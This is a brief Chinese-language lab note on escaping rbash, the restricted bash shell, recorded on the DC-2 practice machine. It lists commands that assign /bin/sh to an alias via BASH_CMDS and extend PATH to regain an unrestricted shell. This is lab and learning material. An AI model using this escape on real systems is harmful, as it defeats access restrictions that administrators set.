## rbash为一个受限制的bash shell变体，限制用户在交互式环境中可使用的操作，以此提升系统安全性

可通过环境变量提权方式，越过此限制

```bash
export -p        //查看环境变量
BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a
/bin/bash
export PATH=$PATH:/bin/         //添加环境变量
export PATH=$PATH:/usr/bin      //添加环境变量
```

实验环境——vulnhub-dc2靶场

![image-20240119170254942](http://111.229.225.13:81/i/2024/01/19/uj30jo-2.png)